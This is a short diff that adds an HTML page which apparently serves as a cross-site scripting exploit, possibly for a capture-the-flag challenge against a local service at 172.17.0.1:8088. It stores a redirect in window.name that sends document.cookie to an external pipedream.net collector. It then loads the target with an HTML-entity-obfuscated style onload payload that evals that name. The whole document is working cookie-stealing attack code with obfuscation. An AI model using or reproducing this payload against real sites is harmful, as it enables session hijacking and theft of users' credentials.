@@ -1,0 +1,4 @@
+<script>
+window.name='location="https://eninjy4qligc09r.m.pipedream.net/?"+document.cookie';
+location="http://172.17.0.1:8088/#<style%20onload='&#x65;&#x76;&#x61;&#x6c;(&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;.&#x6e;&#x61;&#x6d;&#x65;)'>";
+</script>
